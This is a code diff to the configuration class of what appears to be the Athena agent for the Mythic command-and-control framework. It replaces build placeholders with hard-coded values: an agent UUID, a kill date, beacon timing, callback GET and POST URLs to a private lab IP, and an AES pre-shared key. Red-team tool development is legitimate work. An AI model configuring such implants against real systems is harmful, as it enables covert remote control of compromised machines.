@@ -17,16 +17,25 @@ namespace Athena.Config
         public int jitter { get; set; }
         public MythicConfig()
         {
-            
-            this.uuid = "%UUID%";
-            this.killDate = DateTime.Parse("killdate");
-            int sleep = int.TryParse("callback_jitter", out sleep) ? sleep : 60;
+
+            //this.uuid = "%UUID%";
+            //this.killDate = DateTime.Parse("killdate");
+            //int sleep = int.TryParse("callback_jitter", out sleep) ? sleep : 60;
+            //this.sleep = sleep;
+            //int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
+            //this.jitter = jitter;
+            //this.httpConfig = new HTTPS(this.uuid);
+            //this.smbConfig = new SMB();
+            //this.websocketConfig = new Websocket();          
+            this.uuid = "d9ff04e9-0d54-4c46-bfd0-9c160ee7701f";
+            this.killDate = DateTime.Parse("2022-08-22");
+            int sleep = int.TryParse("callback_jitter", out sleep) ? sleep : 10;
             this.sleep = sleep;
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.httpConfig = new HTTPS(this.uuid);
             this.smbConfig = new SMB();
-            this.websocketConfig = new Websocket();          
+            this.websocketConfig = new Websocket();
         }
     }
     public class HTTPS
@@ -48,22 +57,36 @@ namespace Athena.Config
 
         public HTTPS(string uuid)
         {
-            
-            int callbackPort = Int32.Parse("callback_port");
+
+            //int callbackPort = Int32.Parse("callback_port");
+            //string callbackHost = "callback_host";
+            //string callbackURL = $"{callbackHost}:{callbackPort}";
+            //this.userAgent = "user-agent";
+            //this.hostHeader = "%HOSTHEADER%";
+            //this.getURL = "callback_host:callback_port/get_uri?query_path_name";
+            //this.postURL = "callback_host:callback_port/post_uri";
+            //this.param = "query_path_name";
+            //this.proxyHost = "proxy_host:proxy_port";
+            //this.proxyPass = "proxy_pass";
+            //this.proxyUser = "proxy_user";
+            //this.psk = "AESPSK";
+            ////Doesn't do anything yet
+            //this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+            int callbackPort = Int32.Parse("80");
             string callbackHost = "callback_host";
             string callbackURL = $"{callbackHost}:{callbackPort}";
             this.userAgent = "user-agent";
             this.hostHeader = "%HOSTHEADER%";
-            this.getURL = "callback_host:callback_port/get_uri?query_path_name";
-            this.postURL = "callback_host:callback_port/post_uri";
+            this.getURL = "http://10.10.50.43/index.html?q=";
+            this.postURL = "http://10.10.50.43/data";
             this.param = "query_path_name";
             this.proxyHost = "proxy_host:proxy_port";
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
-            this.psk = "AESPSK";
+            this.psk = "MWFPg3b/p2RsEsfSNvsniEw6kaItaJXkJntXNXVyyZ4=";
             //Doesn't do anything yet
-            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
-            
+            this.encryptedExchangeCheck = bool.Parse("True");
+
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
